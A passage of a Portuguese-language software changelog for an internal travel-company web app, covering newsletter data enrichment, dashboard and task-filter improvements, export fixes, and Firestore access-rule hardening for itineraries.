2. **Footer regulatório de 800-1000c**: contatos, regulamentos,
   "consulte detalhes" — não tem destino útil mas tem keywords.

Mitigação aplicada em `enrich-mc-claude.cjs`:
- **Stripa primeiros 200c** (header reusado) + **últimos 800c** (footer)
- **Descarta docs com htmlText < 1200c** (provavelmente só boilerplate)
- **Regra dupla de mention**:
  - Subject + name: **1 match basta** (texto curto, específico)
  - htmlText: **exige 2+ ocorrências** (header isolado vira ruído)

### Hotéis específicos adicionados

50 → **104 brands** no dicionário. Patina (Maldives/Bali), Aman
(Tokyo/Venice/Amankora/Amanyara), Soneva (Fushi/Jani/Secret), Cheval
Blanc (Randheli/Paris/St-Tropez), Bulgari (Maldives), EDITION
(Maldives/Sanya/NY), Four Seasons (Maldives/Bora Bora/Mauritius),
Six Senses (vários), St. Regis (Maldives/Bora Bora/Punta Mita),
Ritz-Carlton (Maldives/Reserve), One&Only (Reethi Rah/Le Saint Géran/
Mandarina), Capella (Bangkok/Singapore/Sydney/Ubud), Rosewood
(Mayakoba/Bangkok/Hong Kong), Park Hyatt (Tokyo/Niseko/Mendoza), e trens
de luxo (La Dolce Vita Orient Express, Belmond Andean Explorer, etc).

### Cobertura final (audit pós v4.49.26)

| BU | Cidades inicial → final | Cobertura cities (% docs) |
|---|---|---|
| **Centurion** | 4 → **9** (+125%) | 27/73 (37%) → **39/73 (53%)** |
| **PTS** | 2 → **10** (+400%) | 17/82 (21%) → **46/82 (56%)** |
| **Primetour** | 14 → **29** (+107%) | 64/209 (31%) → **93/209 (44%)** |
| **BTG Ultrablue** | 16 → **18** | 99/240 (41%) → 103/240 (43%) |
| **BTG Partners** | 16 → **18** | 47/152 (31%) → 51/152 (34%) |

Centurion agora identifica destinos do body: **Itacaré, Cusco, Vale
Sagrado** (Peru), além de **Maldivas, Nova York, Polinésia Francesa**.

### Auditoria & idempotência

O script registra `extractedBy: 'claude-backfill-v4.49.25'`,
preserva extracted prévio, e pode ser re-rodado quantas vezes for
necessário — só adiciona, nunca remove.

---

## [4.49.25+20260519-nl-enrich-claude-backfill] — 2026-05-19

Release **PATCH** — Backfill determinístico do `mc_performance.extracted`
curado por Claude (sem custo de API). User questionou: "4 cidades para
Centurion em 1.5 meses? Parece muito abaixo". Audit confirmou.

### Por que não API

User: "vc faz a reclassificação e inputa lá. nada de api". Faz sentido —
o domínio PRIMETOUR (luxury travel) é conhecido, e dicionário curado +
matching determinístico é mais barato e auditável que LLM. Usado:

- **148 cidades** com país-mãe + aliases (NY→Nova York, Tokyo→Tóquio,
  "Cidade do Cabo"→"Cape Town"…)
- **51 países** com aliases PT/EN/ES
- **50 marcas** de hotel/cruzeiro premium

### Falsos positivos cortados na fase DRY-RUN

- "**Como**" (hotel) eliminado — colidia com palavra interrogativa PT
- "**Norman**" eliminado — muito genérico
- "**la**" alias de Los Angeles — colidia com artigo "La" italiano/espanhol
- "**sf**", "**sp**", "**rio**" aliases — polissêmicos demais

### Resultado (audit pós-backfill)

| BU | Cidades antes → depois | Países antes → depois |
|---|---|---|
| **Centurion** | 4 → **6** (+Maldivas, +Nova York) | 5 → **7** |
| **PTS** | 2 → **6** (+Maldivas, NY, Cancún, Aspen) | 3 → **6** |
| **Primetour** | 14 → **22** (+8) | 12 → **19** (+7) |
| **BTG Ultrablue** | 16 → **17** | 9 → **10** (+Turquia) |
| **BTG Partners** | 16 → 16 | 23 → 23 |

**129 docs enriquecidos · +58 cidades · +93 países · +31 marcas.**

### Limitação conhecida (Centurion)

Centurion continua com **menos cidades** que outras BUs porque os
subjects são genuinamente inspiracionais: "Refúgios Exclusivos", "Ilhas
Privativas", "Sua Próxima Fuga" — não mencionam destino. Pra capturar
mais seria necessário ler o HTML body do email (escopo futuro).

### Idempotente + auditável

`functions/enrich-mc-claude.cjs` pode rodar quantas vezes quiser. Só
ADICIONA, nunca remove. Marca `extractedBy: 'claude-backfill-v4.49.25'`
e bump confidence pra `medium` quando enriquece um doc que era `low`.
`functions/audit-mc-performance.cjs` para diagnóstico contínuo.

---

## [4.49.24+20260519-nl-content-sort-expand-drill] — 2026-05-19

Release **MINOR** — Quick wins na aba **Conteúdo & Temas** do dashboard
de Newsletters, baseado em feedback estruturado do user (5 pontos:
classificação dupla, visualização, drill-down, pipeline e exports).
Esta release entrega **só os quick wins** (visualização + drill); os
demais pontos (duplo eixo comercial/turismo, auditoria do pipeline,
PPT export) entram em releases subsequentes.

### Visualização

- **Sortar colunas** por click no header: Disparos, Abertura, Cliques,
  Opt-out, e nome da entidade. Setas ▼/▲ indicam direção; click no
  mesmo col alterna asc/desc. Estado persistido in-memory por bloco
  (`_contentTableState`) — sobrevive re-renders mas reseta ao navegar
  fora da aba.
- **Botão "Ver todos"** abaixo de cada tabela/bars. Antes hard-cap em
  top 12 (países/cidades/temas) ou top 10 (hotéis/cruises). Agora
  toggle entre top-N e lista completa, com label dinâmico
  ("+ Ver todos os 47" ↔ "− Colapsar (top 12)").
- **Colunas novas:** Cliques (% click rate) e Opt-out (% optout rate)
  em todas as tabelas/bars. Agregador `aggregateContent` ganhou
  `totalClick` e `totalOptOut` somando dos docs.

### Drill-down

- **Click em qualquer linha** (.nlc-drill-row) abre **modal com os
  disparos** que compõem aquele item. Antes:
  - Países/cidades: virava filtro (UX limitada — perdia contexto)
  - Hotéis/temas/types: nada acontecia
- Modal mostra: subject + código, BU, data de envio, enviados,
  abertura, cliques, opt-out, botão **✎** pra editar classificação
  manual. **Respeita os filtros aplicados** no dashboard (sends[]
  vem do agregador filtrado).
- Aplicável a: países, cidades, hotéis, cruises, temas, marcas,
  audiências, tipos de newsletter.

### O que vem depois (roadmap)

- **Duplo eixo de classificação** (Comercial + Turismo) com ordem de
  prioridade documentada — migração via mapping determinístico do
  `newsletterType` atual (sem custo de API).
- **Auditoria do pipeline** Centurion (4 cidades em 1.5 meses):
  script de diagnóstico mostrando docs por BU/período/enriched.
- **Export PPT** + garantir Excel/PPT respeitam BU/período/
  classificações/insights filtrados.

---

## [4.49.23+20260519-feedbacks-1x1-vs-sistema] — 2026-05-19

Release **PATCH** — User reportou: "Feedbacks: entrei e atualizei 3x,
mostrava 1 teste. Acionei via email e veio com todos em Equipes. Tem 2
feedbacks (sistema vs RH), sistema confunde?". Audit revelou que os 2
módulos estão arquiteturalmente segregados (coleções diferentes,
páginas diferentes), mas **UX visual confundia** e havia **race
condition** no filtro hierárquico que explicava o "só 1 teste".

### 🐛 Race condition — filtro hierárquico de `/feedbacks`

`renderFeedbacks` aplicava filtro restritivo ANTES de `userRole`/
`userPermissions` estarem carregados. Cascata:
- `store.isMaster()` retornava false (userRole ainda null)
- `store.can('system_view_all')` também false (perms vazias)
- Entrava na branch restritiva com `visibleSet = só self`
- Resultado: só feedbacks onde o user é collaborator OU manager = 1 entry

Fix em 3 partes:
1. **Aguarda userRole** carregar (loop polling até 2s · 20 ticks de 100ms)
2. **Fallback de role**: além de `isMaster()`, checa `userRole.id === 'master'`
   e `userProfile.roleId === 'master'` (cobre profile carregado mas role obj ainda não)
3. **Fail-open** se userRole ainda não chegou: NÃO aplica filtro client,
   confia nas Firestore rules server-side (seguro, é defesa em camada)

### 🎨 Clareza visual — distinção entre os 2 conceitos

Os 2 módulos viviam no sidebar com mesmo ícone (`feedbacks` = balão de chat).
Diferenciação aplicada:

- **Sidebar**:
  - `/feedbacks` → label **"Feedbacks 1:1"** (era "Feedbacks") · ícone mantido (balão = conversa entre pessoas)
  - `/system-feedback` → ícone novo **`system-feedback`** (megafone) · label mantido
- **Page headers** com cross-link explícito:
  - `/feedbacks`: "(RH · gestor↔colaborador) · Bugs ou sugestões do app? → Feedbacks do Sistema"
  - `/system-feedback`: "(Bugs/sugestões do app) · Avaliações 1:1 de pessoas? → Feedbacks 1:1"

### Sem mudança arquitetural

Os 2 módulos seguem com coleções separadas (`feedbacks` vs
`system_feedback`), perms separadas (`feedback_view/create` vs
`system_manage_settings`), services e páginas dedicadas. Só UX e
defesa de carregamento foram tocadas — segurança/dados intactos.

---

## [4.49.22+20260519-exports-skip-vazios] — 2026-05-19

Release **PATCH** — Exports modulares: blocos vazios são ocultados em
**ambos** os geradores (Portal de Dicas e Roteiros). User reportou:
"vi um roteiro que carregava um bloco vazio. Se está vazio, precisaria
ocultar". Mesmo princípio aplicado nas dicas.

### Portal de Dicas (`portalGenerator.js`)

`buildContent()` antes só checava `!data`. Resultado: se um segmento
estava presente no doc mas com `items=[]` e sem texto descritivo, o
exporter (PDF / Word / PowerPoint) renderizava o **header** do segmento
("RESTAURANTES", "ATRAÇÕES"…) seguido de espaço em branco.

Adicionado `segHasContent(segDef, data)` (mesmo critério do
`segHasContent` do editor v4.49.13+):
- `place_list`/`agenda`: precisa de items com título OU `themeDesc` OU `periodoAgenda`
- `simple_list`: items com título OU `themeDesc`
- `special_info`: qualquer campo de `info` preenchido (descrição,
  população, moeda, língua, voltagem, clima, representação…)

Aplica nos 3 formatos (DOCX, PDF, PPTX) — usam o mesmo `buildContent`.

### Roteiros (`roteiroGenerator.js`)

3 seções vulneráveis: o título era renderizado ANTES do check de
conteúdo. Se a verificação interna acabasse com lista vazia, ficava
título solto.

- **VALORES** (`buildPricingSection`): título saía mesmo se `customRows`
  tivesse só entries com `label` e sem `value`. Fix: filtra entries
  exigindo label E value, e retorna early se `rows.length === 0`.
- **SERVIÇOS OPCIONAIS** (`buildOptionalsSection`): mesma armadilha —
  optionals podia ter `[{},{}]` (entries totalmente vazias). Fix:
  filtra antes do título, return early se zerar.
- **INFORMAÇÕES IMPORTANTES** (`buildImportantInfoSection`):
  `customFields` com `{label:'', value:''}` zerava sections após o filtro
  mas o título já tinha saído. Fix: monta sections, return early se vazio.

Outras seções (HOSPEDAGEM, INCLUI/NÃO INCLUI, PAGAMENTO, CANCELAMENTO,
DIA A DIA, DICAS LOCAIS) já tinham defesa adequada — orchestrator e/ou
função interna verificavam `.length` antes do título. Documentado no
audit.

---

## [4.49.21+20260519-metalinks-segue-responsavel] — 2026-05-19

Release **PATCH** — **Bug fix crítico** reportado por user:
> "quando crio a tarefa, a meta fica vinculada ao meu user, mesmo que eu
> coloque outras pessoas como responsáveis. Como estou gerenciando a
> empresa, abro e concluo tarefas, mas a meta tem de estar vinculada ao
> responsável por ela."

### Diagnóstico

3 causas combinadas no `taskModal.js`:

1. **Auto-assign self em tarefas novas**: `currentAssignees.length === 0`
   → criador entrava como assignee. Pra analista isso é OK (cria a própria
   tarefa); pra gestor é errado (cria pra equipe).
2. **`activeUserId` do picker de metas** = primeiro assignee. Como o criador
   foi auto-adicionado, o picker abria na aba dele e os links iam pra ele.
3. **Trocar assignee depois NÃO removia o metaLink órfão** → ficava
   `metaLinks: [{ userId: <criador>, … }]` mesmo com criador fora dos assignees.

### Fix em 3 camadas

1. **Auto-assign condicional**: só pra role `member` (Analista) e `partner`.
   Coordinator/Manager/Admin/Master começam o modal com assignees vazio.
2. **Sync on remove**: quando user remove um chip de responsável no modal,
   `task.metaLinks` perde TODOS os links daquele userId imediatamente.
3. **Prune no save**: filtro final no payload garante que cada `metaLinks[i].userId`
   está em `assignees` (ou é o sentinel `__task__` p/ tarefas sem responsável).
   Defesa em profundidade — se UI escapar algo, o save corrige.

### Comportamento esperado agora

- Gestor (Renê/Diretoria) abre Nova Tarefa → assignees vazio.
- Adiciona João como responsável.
- Picker de meta abre na aba do João → meta vai p/ `userId: João`.
- Gestor salva → `metaLinks: [{ userId: João, … }]`. ✓
- No dashboard de João, a meta aparece (não na do Renê).

Default histórico do Analista preservado (auto-assign segue funcionando).

---

## [4.49.20+20260519-presets-atividade-vs-emjogo] — 2026-05-19

Release **MINOR** — User reportou que mesmo com mesmo predicate "sem tipo",
o filtro `Últimos 30 dias` em #tasks dava 825 enquanto dash dava 129.
**Causa:** o label "Últimos 30 dias" enganava — o preset NÃO é atividade
no período. É "abertas + concluídas recentes" (semântica de workflow).

### Reorganização dos presets de prazo em 3 famílias semânticas

O dropdown agora tem `<optgroup>`s claros:

1. **Por prazo (dueDate):** Atrasadas, Hoje, Amanhã, Esta/Próxima semana,
   Este mês, Sem prazo. → filtra por `t.dueDate`.

2. **Em jogo (workflow):** "Em jogo · 30d (padrão)" e "Em jogo · 90d"
   (era `last30Days` / `last90Days`). → mantém todas abertas + concluídas
   no período. Útil pro dia a dia operacional.

3. **Atividade no período (KPI):** `📊 Atividade · 7d`, `· 30d (bate c/ dash)`,
   `· 90d`. → filtra por `createdAt OR completedAt` dentro do range. **Mesmo
   critério do `inPeriod()` em #dashboards.** Quem clica num card do dash
   aterriza com EXATAMENTE a mesma contagem.

### Deep-link do dashboard usa preset nomeado

`dashboards.js`: `periodLinkSuffix` agora envia `&datePreset=activityIn30d`
(ou 7d/90d) quando o período bate; só usa `from/to` explícito pra `12m`
ou custom. URL mais curta, conceito mais claro.

### Comportamento histórico preservado

O default segue `last30Days` (renomeado "Em jogo · 30d") — não muda o
workflow diário de ninguém. Quem quer KPI estilo dashboard agora tem opção
explícita na própria toolbar.

---

## [4.49.19+20260519-dash-prod-coerencia-fim] — 2026-05-19

Release **PATCH** — Cola de coerência fim a fim entre Dashboard ↔ #tasks.

Versão 4.49.18 trouxe deep-link mas usava `datePreset=last30Days` em #tasks,
que tem semântica diferente de "ativa no período" do dashboard. Resultado:
clicava no card "Sem tipo (122)" e #tasks abria com 825 tarefas (porque
`last30Days` inclui TODAS abertas + done recentes).

- **Novo preset `activityInPeriod`** em `tasks.js`: filtra por
  `createdAt OR completedAt` dentro do range — mesmo critério do
  `inPeriod()` em `dashboards.js`.
- Deep-link agora envia `?type=…&datePreset=activityInPeriod&from=<ymd>&to=<ymd>`
  com o range exato do período ativo do dashboard.
- URL params `from` / `to` agora reconhecidos no boot do `tasks.js`.

Agora a contagem do card e da lista batem precisamente.

---

## [4.49.18+20260519-dash-prod-coerencia] — 2026-05-19

Release **PATCH** — Coerência entre Dashboard de Produtividade e a página de
Tarefas. User reportou divergência ("122 sem tipo no dash vs 828 sem tipo
em #tasks") + usuários pending aparecendo no ranking da equipe.

### 🐛 Bug fix — Sem tipo desalinhado

`analytics.js getProductivityByType` usava `t.typeId || '__none__'`,
ignorando o campo legacy `t.type` (string). Resultado: tarefas com
`t.type='newsletter'` mas sem typeId caíam no bucket "Sem tipo",
inflando essa contagem.

- Agora usa `t.typeId || t.type || '__none__'` — **mesmo critério** do
  `getTimePerTaskByType` e do filtro `__NONE__` em `tasks.js`
  (`!t.typeId && !t.type`).
- Tarefas com legacy type voltam pro bucket correto (Newsletter, etc.).

### 🐛 Bug fix — Pending users no ranking equipe

`getTasksByMember` listava todo uid presente em `t.assignees[]`, incluindo
usuários `pendingSso: true` (pré-cadastrados sem primeiro login SSO) e
`active: false` (desativados). Poluía o ranking com nomes irrelevantes.

- Agora filtra por padrão. Aceita opção `{ includeOrphans: true }` se
  alguma view futura quiser exibir (ex: auditoria de orphan assignments).
- Cada entry ganha flags `_isPending` / `_isInactive` / `_isOrphan`.

### 🔗 Drill-down do dashboard → #tasks

Tornado clicáveis os 2 rankings (equipe + tipo). Cada item vira
deep-link pra `#tasks` com filtros e período pré-aplicados, garantindo
**a mesma contagem** que aparece no card:

- `tasks.js` agora lê `?type=<id|__NONE__>` e `?datePreset=<preset>` da URL.
- Dashboard mapeia o período ativo (`7d/30d/90d/12m`) pro preset
  equivalente em `#tasks` (`last7Days/last30Days/last90Days/<vazio>`).
- `renderLeaderboard` aceita `href` opcional por item e envelopa em `<a>`.

Agora user clica em "Sem tipo · 122" no dash, abre `#tasks?type=__NONE__&datePreset=last30Days`,
e vê exatamente 122 tarefas — sem mistério.

---

## [4.49.17+20260519-calendar-up-filters-type] — 2026-05-19

Release **MINOR** — Duas mudanças baseadas em feedback direto do user:

### 📅 Meu Painel — Meu Calendário reorganizado

- **Calendário sobe pro topo da coluna esquerda** (era abaixo de Minhas Tarefas).
- **Mini-mês sempre aberto** (era colapsável). Toggle removido — agenda
  e visão mensal ficam visíveis ao mesmo tempo.
- **Tooltip nas células do mês**: passar o mouse mostra os títulos das
  tarefas daquele dia (até 5 com horário; >5 vira "+N mais"). User não
  precisa mais clicar pra saber o que tem no dia.

### 🔍 Filtros harmonizados (tasks · steps · calendar · timeline)

User identificou que só Steps tinha filtro por tipo de tarefa e nenhum
tinha opção "sem tipo". Harmonização nas 4 páginas:

- **Filtro "Sem tipo"** (sentinel `__NONE__`) em todas: lista tarefas
  com `typeId` vazio E `type` legacy vazio. Útil pra cleanup/auditoria.
- **`tasks.js` agora tem filtro por tipo** (estava ausente):
  - Picker com busca, mesmo padrão dos outros filtros (status, prioridade…)
  - "∅ Sem tipo" sempre no topo da lista
  - Visível por padrão (toggle no ⚙ Configurar filtros)
  - Valor persistido em `tasks.filterValues.v1` junto com os outros
- **`filterBar.js`** (usado por kanban/calendar/timeline): typeOpts
  agora inclui sentinel; `buildFilterFn` trata o caso.
- **Sem regressão**: lookup `taskTypes` continua via `store.get()`,
  filterVisibility já existente preserva preferências do user.

---

## [4.49.16+20260519-meu-calendario-agenda] — 2026-05-19

Release **PATCH** — Reformulação do **Meu Calendário** (v4.49.15) com base
em feedback: "só dots não diz o que eu tenho que fazer". Agora o card mostra
primeiro uma **agenda acionável** com título de cada tarefa.

- **Em atraso** (se houver): seção no topo com borda vermelha, lista as
  tarefas vencidas não-concluídas (top 5 + link "+N atrasadas →").
- **Hoje · Amanhã · próximos 14 dias**: agrupado por dia, com header
  "Hoje" em dourado, "Amanhã" em destaque, dias da semana por extenso
  até 7d, depois "Seg, 02/06". Cada tarefa mostra horário (se houver),
  título, status (pill) e cor da borda esquerda por status.
- **Click na tarefa** abre o taskModal padrão (mesmo fluxo de Minhas Tarefas).
- **Resumo no header**: "3 hoje · 1 em atraso · 5 próximos" pra glance.
- **Mini-mês colapsado** por padrão (era o principal antes). Agora fica
  como toggle "Visão do mês — Maio 2026 ▸" — abre quando o user quiser
  ver o panorama mensal. Lazy render: só renderiza se expandir.
- Empty state honesto: "Sem tarefas com data marcada nos próximos 14 dias.
  Tarefas com data de vencimento aparecem aqui."

---

## [4.49.15+20260519-meu-calendario-dashboard] — 2026-05-19

Release **MINOR** — Bloco **📅 Meu Calendário** no Meu Painel: mini-mês 6×7
abaixo de "Minhas Tarefas" mostrando as tarefas do user ancoradas em `dueDate`.

- Layout: coluna esquerda virou flex vertical (Minhas Tarefas + Meu Calendário),
  coluna direita inalterada. Preenche o espaço em branco que sobrava abaixo de
  Minhas Tarefas sem reformatar a grid.
- Cada célula do mês mostra o número do dia + até 3 dots coloridos por status
  (azul/laranja/roxo/verde…); se a tarefa do dia for >3, mostra "+N".
- Click no dia abre detalhe inline com a lista completa daquele dia; click
  numa tarefa abre o taskModal padrão.
- Nav: ◀ mês anterior · Hoje · ▶ próximo mês · "Agenda completa →" pra `#calendar`.
- Legenda compacta dos 5 status (a fazer/em andamento/revisão/retrabalho/concluída).
- 100% client-side (reusa `myTasks` já fetched pelo render principal — zero
  query extra, render O(42) células).

---

## [4.49.14+20260519-analista-portal-dashboard] — 2026-05-19

Release **PATCH** — Liberado `dashboard_portal_view` pro Analista.
Faz sentido com a operação real: o consultor que produz dicas precisa
ver top destinos, links ativos e geração agregada do Portal pra orientar
o próprio trabalho. Demais dashboards executivos (produtividade, roteiros,
csat) seguem restritos a coord+. Migração: `functions/align-analista-portal-dashboard.cjs`.

---

## [4.49.13+20260519-portal-tips-fixes] — 2026-05-19

Release **PATCH** — Pacote de fixes no Portal de Dicas (relatados em uso real):

- **Bug 1 — Categorias inacessíveis**: criação/edição de categorias só aparecia
  dentro do dropdown de um item já cadastrado. Adicionado botão **🏷 Categorias**
  no header de cada painel (place_list e agenda) que abre um modal dedicado
  de gerenciamento de categorias (`openCategoriesModal`).
- **Bug 2 — Segmentos só com texto descartados**: `segHasContent` agora também
  considera `themeDesc` (Bairros/Arredores) e `periodoAgenda` (Agenda Cultural)
  como conteúdo válido, evitando que segmentos puramente textuais sumam ao salvar.
- **Bug 3 — Import PDF erro silencioso**: parser agora exibe mensagem clara
  quando o nome do arquivo não está no formato esperado
  (`Continente - País - Cidade.pdf`). Aviso destacado na UI de upload.
- **Feature 4 — Observações internas**: campo `internalNotes` na dica para
  contexto interno do time (ex.: "RESTAURANTE BOM PARA CASAIS"). Será usado
  como contexto pela IA no futuro.
- **Feature 5 — Import via DOCX**: agora aceita `.docx` no upload de dicas,
  reaproveitando o mesmo pipeline do PDF (mammoth.js carregado on-demand).

---

## [4.49.8+20260518-roles-reorg-office] — 2026-05-18

Release **PATCH** — Reorganização do catálogo RBAC: `office_view` movido de
"Portal de Dicas" pro grupo renomeado "Equipe, Ausências e Presença".
Coordenador agora tem `office_view` explícito (estava `undefined`).

---

## [4.49.7+20260518-destinations-bulk-import] — 2026-05-18

Release **MINOR** — Bulk import de destinos via Excel (`.xlsx/.xls/.csv`)
no Portal de Dicas. Novo componente `destinationsImport.js`: wizard
com preview tabular (✓ novo / ⚠ duplicado / ✗ erro), dedup automático
via slug, download de template Excel modelo, tolerância a aliases de coluna.
Gated por `canManageDestinations()` — Analista também pode importar.

---

## [4.49.6+20260518-segments-categories-perm] — 2026-05-18

Release **PATCH** — Nova perm `portal_segments_manage` liberada pro Analista
(mesmo padrão de destinos). Wire em `portal.js` (saveCategories,
saveCustomSegment, deleteCustomSegment) + `portalTipEditor.js` (botão
"+ Novo segmento"). Propagada nos 6 roles em prod via `updateDoc`.

---

## [4.49.5+20260518-content-calendar-type-filter] — 2026-05-18

Release **PATCH** — Calendário de Conteúdo: slots reais (do banco)
agora respeitam filtro de tipo via task vinculada. 3 slots fantasma
("Dia Nacional", "Dia dos Namorados", "Notícia") sumiam quando filtro
estava ativo. `slotsForDate` + `renderListView` checam
`visibleTaskTypes` via `_linkedTasks.get(slot.taskId).typeId`.

---

## [4.49.4+20260518-calendar-slot-filter-fix] — 2026-05-18

Release **PATCH** — Calendar: slots virtuais respeitam filtro de tipo
do toolbar. `getSlotsForDate(date, {typeId, sector})` recebe filtros
em modo standard (não só pipeline). `renderDay` aplica `buildFilterFn`.
Validado live: 300→55 cards (-82%) com filtro Newsletter.

---

## [4.49.3+20260518-filters-show-all-types-projects] — 2026-05-18

Release **PATCH** — Filtros mostram TODOS os tipos e projetos. Removido
filtro sector que escondia tipos no dropdown (timeline/kanban/calendar).
Calendar usa `fetchProjects` local. `fetchProjects({allWorkspaces:true})`
em 4 páginas pra mostrar projetos cross-squad. Listing continua filtrado
por escopo do user.

---

## [4.49.2+20260518-roles-audit-destinos-perm] — 2026-05-18

Release **MINOR** — Auditoria completa do catálogo RBAC + nova perm
`portal_destinations_manage` (granular, liberada pro Analista). Wire de
permissions órfãs: `portal_areas_view/manage`, `requests_manage`,
`ai_skills_manage`, `ai_dashboard_view`. 3 novos helpers em store.js.

---

## [4.49.1+20260518-notif-deeplinks] — 2026-05-18

Release **MINOR** — Notificações clicáveis com deep-link. Helper
`deriveRouteForEntity(entityType, entityId)` deriva rota fundo: task
→ abre modal, project → abre detalhe, goal → abre form. Suporte a 12
entityTypes. URL params limpos via `history.replaceState`.

---

## [4.49.0+20260518-sprint7-tasks-filters-slots-dedup] — 2026-05-18

Release **MAJOR de patch** — Sprint denso com 6 frentes:

- **Item 6 (CRÍTICO)**: duplicação user SSO — firestore rule self-delete
  pending_* por email match + cleanup retroativo em todo login (`auth.js`).
  5 docs (Bruno, Letícia, João, Thaís, Beatriz) limpos em prod.
- **Item 1**: coluna Tipo/Etapa vazia — lookup via `pageTaskTypes`.
- **Item 3**: tipos sumindo no modal — removido filtro `workspaceId` em
  `fetchTaskTypes` (8 tipos voltam).
- **Item 2**: busca no filtro de Projetos em tasks.js (`bindOptionPicker`).
- **Item 4**: persistência de filtros em `localStorage` por página
  (tarefas/steps/calendario/timeline).
- **Item 5**: Slots → Produtividade — campo `fromSlot:{typeId,slotId,date}`
  + widget "◌ Conversão de Slots" no dashboard.

---

## [4.48.3+20260518-cache-loop-prevention] — 2026-05-18

Release **PATCH** — Prevenção definitiva de loop pós-deploy.
`<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">`
em index.html + auto-reload version detector em preload.js. Browser
sempre busca index.html fresh; se versão mudou recentemente, força
`location.reload(true)` UMA vez pra purgar módulos cacheados.

---

## [4.48.2+20260518-dynamic-import-portalAreas] — 2026-05-18

Release **PATCH** — `portalAreas.js` convertido pra dynamic import.
Cascata de static imports quebrava boot quando o módulo cache stale
falhava. Dynamic import isola a falha — `initAuthObserver` continua
mesmo se portalAreas não carregar.

---

## [4.48.1+20260518-jsdoc-fix] — 2026-05-18

Release **PATCH** — Fix crítico de parsing em `js/services/areaTokens.js`.
Comentário `/* */` dentro de `/** */` gerava `SyntaxError` e travava o
boot inteiro. Substituído por texto sem delimitadores.

---

## [4.40.28+20260518-dev-hours-products-tab] — 2026-05-18

Release **MINOR** — Sub-dashboard executivo de horas em "Foco em produto"
(Portal de Dicas / Banco de Imagens / Gerador de Roteiros).

### Pedido do user
> "vou precisar de uma aba em 'horas de desenvolvimento' para falar apenas
> sobre portal de dicas/banco de imagens/gerador de roteiros, com o mesmo
> cálculo de horas (e uma calculadora específica pra ele, nos mesmos moldes
> da home), e maior detalhamento sobre o que está sendo feito"

### O que veio
- **`js/services/devHours.js`**: nova constante `MODULES` (3 módulos com
  cor/ícone/desc), helpers `detectEntryModules()` + `entryMatchesModules()` +
  `aggregateByModule()`. Heurística por título/slug/phaseLabel (intencionalmente
  NÃO usa summary — gera muito false positive). Schema permite override via
  campo `modules: string[]` em entries futuras.
- **`dev-hours-view.html`**: tab switcher "Visão geral" × "Foco em produto"
  com badge dinâmica de contagem; deep link via hash `#products`.
- **Tab Produto**: card de breakdown por módulo (horas/custo/entries/último
  toque) + listagem detalhada com summary completo (não truncado) + pills
  coloridas indicando módulo(s) de cada entry.
- **`js/services/devHoursPdf.js`**: opções `focus: 'products'`,
  `includeModuleBreakdown`, `includeFullSummary`. Capa muda título pra
  "Avanços em Produto", desenha card de breakdown por módulo, renderiza
  summary completo em cada linha da tabela com pills coloridas.

### Comportamento
- Entries existentes classificadas automaticamente via heurística (8 entries
  detectadas no estado atual: 1 fase + 7 releases).
- Phase legacy "Portal de Solicitações + Roteiros + Pesquisas externas"
  creditada 100% pra Roteiros (não dá pra dividir retroativamente — futuras
  entries multi-módulo devem usar campo `modules` explícito).
- Crédito proporcional quando entry toca múltiplos módulos (ex: entry de
  Banco de Imagens que também afeta Roteiros conta 50% pra cada).

### Validação
- Testado E2E via Chrome MCP: tab switching, badge update, breakdown render,
  detail cards, PDF generation (41KB, 3 páginas).
- Confirmado que heurística estrita (sem summary) elimina false positives
  como "IA Hub: vision" virando "Banco de Imagens".

### Findings paralelos
- **Multi-marca em Portal de Dicas: NÃO EXISTE.** Multi-brand está em
  news-monitor / SoV (Share of Voice), não em Portal. Para roteiros
  multi-marca, ou estende Portal (sprint dedicada) ou implementa
  direto no editor de roteiros.

---

## [4.40.31+20260518-roteiros-sprint1-hardening] — 2026-05-18

Release **MINOR** — Sprint 1 do refactor do módulo de Roteiros:
hardening de segurança + 7 bug fixes + hierarquia de visualização.

### Pedido do user
> "pode começar com o sprint 1 depois disso"
> (após o user aprovar o plano de 4 sprints do audit do módulo)

### 1. Hardening Firestore Rules

**Antes (vetor de tampering identificado em audit bancária):**
- `allow update: if isAuth();` — qualquer auth user editava roteiro alheio.

**Depois:**
- `allow create: if isAuth() && request.resource.data.consultantId == request.auth.uid;`
- `allow update: if isAuth() && (isManager() OR consultantId==self OR uid in collaboratorIds)`
- `allow delete:` mantém (admin OR consultantId==self).

### 2. Bug fixes B01-B07

| ID | Onde | Fix |
|---|---|---|
| B01 | `roteiroEditor.js` collectFormData | `childrenAges` truncado pra `client.children` count (antes mantinha idades de crianças removidas) |
| B02 | `roteiros.js` generateRoteiroFromPrompt | Já tem try/catch + toast em ambos os layers (fetchSkills + chatWithAI). Sem mudança necessária — bug já resolvido em iterações anteriores. |
| B03 | `roteiroEditor.js` | Sem ação code-side de "auto-preencher portal" no estado atual. Bug obsoleto. |
| B04 | `sanitizeForSave()` novo | Destinos sem cidade filtrados antes de gravar |
| B05 | `sanitizeForSave()` novo | Preços negativos clamp a 0 (pricing.perPerson/Couple + optionals) |
| B06 | `sanitizeForSave()` novo | Items vazios filtrados em optionals/cancellation/customRows/customFields (antes só includes/excludes) |
| B07 | `preset-includes/excludes` | Dedup case-insensitive + trim (antes "Voo" e "voo" coexistiam) |

### 3. Hierarquia de visualização

`fetchRoteiros()` simplificada — sempre retorna todos os roteiros (com orderBy
server-side). Filtragem hierárquica acontece na página via `getVisibleUserIds()`
— mesmo padrão de `/goals` e `/feedbacks`.

Comportamento:
- **master / roteiro_manage / system_view_all** → vê todos.
- **gerente** → vê próprios + subordinados (managerId transitivo).
- **analista** → vê próprios + roteiros onde está em `collaboratorIds[]`.

Inclui suporte futuro pra colaboração multi-pessoa (campo `collaboratorIds[]`
ainda não populado pela UI — entra no Sprint 2 com schema evolution).

### Validação
- Firestore rules deployadas via `firebase deploy --only firestore:rules`.
- Code change live após push (GitHub Pages ~1min).

### Próximo (Sprint 2)
Schema evolution: client → client + travelers[] (responsável + acompanhantes),
collaboratorIds[] populado pela UI, workflowMode opt-in, costPricing (custo
interno separado do preço).

---

## [4.42.0+20260518-roteiros-sprint3-tips-embed] — 2026-05-18

Release **MINOR** — Sprint 3 do refactor de Roteiros: embed de dicas do
Portal de Dicas com snapshot + re-publish.

### Pedido do user
> "sprint 3"
> (após Sprint 2 entregue e testado: travelers + collab + workflow + cost)

### Comportamento
- User abre roteiro → seção nova **"💡 Dicas anexas"** (12ª aba)
- Clica "+ Anexar dica" → modal lista dicas do Portal com filtros (continent + busca)
